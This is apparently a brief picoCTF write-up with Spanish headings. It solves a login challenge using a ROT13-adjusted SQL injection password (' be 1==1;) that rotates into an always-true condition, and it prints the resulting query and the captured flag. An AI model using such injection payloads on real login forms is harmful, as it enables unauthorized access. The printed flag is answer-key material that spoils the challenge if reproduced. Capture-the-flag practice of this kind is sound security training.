## Objetivo
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/29132/` ([link](https://jupiter.challenges.picoctf.org/problem/29132/)) or http://jupiter.challenges.picoctf.org:29132. Try to see if you can login as admin!
## Solución
```
password: ' be 1==1;
SQL query: SELECT * FROM admin where password = '' or 1==1;'

# Logged in!

Your flag is: picoCTF{3v3n_m0r3_SQL_06a9db19}
```
## Notas
Como sabemos que la contraseña que colocamos se rota pues vamos a poner la pwd: 
```
' or 1==!;
```
Y como se rota, entonces ya nadamas agarramos el rotado y da verdadero.
